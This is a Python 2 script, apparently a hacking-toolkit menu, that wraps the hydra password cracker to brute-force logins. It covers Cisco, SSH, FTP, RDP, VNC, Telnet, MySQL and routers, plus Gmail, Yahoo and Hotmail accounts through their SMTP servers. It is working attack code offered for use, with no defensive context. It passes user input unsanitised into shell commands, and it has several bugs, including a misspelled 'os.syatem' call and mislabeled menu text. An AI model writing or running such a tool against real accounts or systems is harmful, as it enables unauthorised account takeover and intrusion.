import os, sys, time
from time import sleep as timeout
def restart_program():
        python = sys.executable
        os.execl(python, python, * sys.argv)
        curdir = os.getcwd()
os.system("clear")
os.system("figlet Brute Force")
print
print "  [01]> Cisco Brute Force         "
print "  [02]> VNC Brute Force           "
print "  [03]> FTP Brute Force           "
print "  [04]> Gmail Brute Force         "
print "  [05]> SSH Brute Force           "
print "  [06]> TeamSpeak Brute Force     "
print "  [07]> Telnet Brute Force        "
print "  [08]> Yahoo Mail Brute Force    "
print "  [09]> Hotmail Brute Force       "
print "  [10]> Router Speedy Brute Force "
print "  [11]> RDP Brute Force           "
print "  [12]> MySQL Brute Force         "
print "  [13]> Facebook Brute Force      "
print
print " [00]> Exit"
print
bhydra = raw_input("Brute Force Console ==>> ")

if bhydra == '01' or bhydra == '1':
  os.system("clear")
  os.system("figlet Cisco Brute Force ")
  iphost = raw_input("[*] IP/Hostname : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -P %s %s cisco" % (word, iphost))
  sys.exit()
  
elif bhydra == '02' or bhydra == '2':
  os.system("clear")
  os.system("figlet VNC Brute Force")
  word = raw_input("[*] Wordlist : ")
  iphost = raw_input("[*] IP/Hostname : ")
  os.system("hydra -P %s -e n -t 1 %s vnc -V" % (word, iphost))
  iphost = raw_input("[*] IP/Hostname : ")
  
elif bhydra == '03' or bhydra == '3':
  os.system("figlet FTP Brute Force")
  user = raw_input("[*] User : ")
  iphost = raw_input("[*] IP/Hostname : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s %s ftp" % (user, word, iphost))
  sys.exit()
  
elif bhydra == '04' or bhydra == '4':
  os.system("clear")
  os.system("figlet Gmail Brute Force")
  email = raw_input("[*] Email : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
  sys.exit()
  
elif bhydra == '05' or bhydra == '5':
   os.system("clear")
   os.system("figlet SSH Brute Force")
   user = raw_input("[*] User : ")
   word = raw_input("[*] Wordlist : ")
   iphost = raw_input("[*] IP/Hostname : ")
   os.system("hydra -l %s -P %s %s ssh" % (user, word, iphost))
   sys.exit()
   
elif bhydra == '06' or bhydra == '6':
   os.system("clear")
   os.system("figlet TeamSpeak Brute Force")
   user = raw_input("[*] User : ")
   word = raw_input("[*] Wordlist : ")
   iphost = raw_input("[*] IP/Hostname : ")
   os.system("hydra -l %s -P %s -s 8676 %s teamspeak" % (user, word, iphost))
   sys.exit()

elif bhydra == '07' or bhydra == '7':
  os.system("clear")
  os.system("figlet Telnet Brute Force")
  user = raw_input("[*] User : ")
  word = raw_input("[*] Wordlist : ")
  iphost = raw_input("[*] IP/Hostname : ")
  os.system("hydra -l %s -P %s %s telnet" % (user, word, iphost))
  sys.exit()
	
elif bhydra == '08' or bhydra == '8':
  os.system("clear")
  os.system("Yahoo Brute Force")
  email = raw_input("[*] Email : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (email, word))
  sys.exit()
  
elif bhydra == '09' or bhydra == '9':
  os.system("clear")
  os.system("figlet Hotmail Brute Force")
  email = raw_input("[*] Email : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -l %s -P %s -s 587 smtp.live.com smtp" % (email, word))
  sys.exit()
  
elif bhydra == '10':
  os.system("clear")
  os.system("figlet Router Speedy Brute Force")
  user = raw_input("[*] User : ")
  word = raw_input("[*] Wordlist : ")
  iphost = raw_input("[*] IP/Hostname : ")
  os.system("hydra -m / -l %s -P %s %s http-get" % (user, word, iphost))
  sys.exit()
	
elif bhydra == '11':
  os.system("clear")
  os.system("figlet PDR Brute Force")
  user = raw_input("[*] User : ")
  word = raw_input("[*] Wordlist : ")
  iphost = raw_input("[*] IP/Hostname : ")
  os.system("hydra -t 1 -V -f -l %s -P %s %s rdp" % (user, word, iphost))
  sys.exit()
	
elif bhydra == '12':
  os.syatem("clear")
  os.system("figlet My SQL Brute Force")
  user = raw_input("[*] User : ")
  word = raw_input("[*] Wordlist : ")
  os.system("hydra -t 5 -V -f -l %s -e ns -P %s localhost mysql" % (user, word))
	
elif bhydra == "13":
 os.system("clear")
 os.system("figlet Facebook Brute Force")
 os.system("python2 facebook")

	
elif bhydra == '00' or bhydra == '0':
	os.system("python2 Ha3MrX.py")
	
else:
	print "\n[!] ERROR : Wrong Input"
	time.sleep(1)
	restart_program()
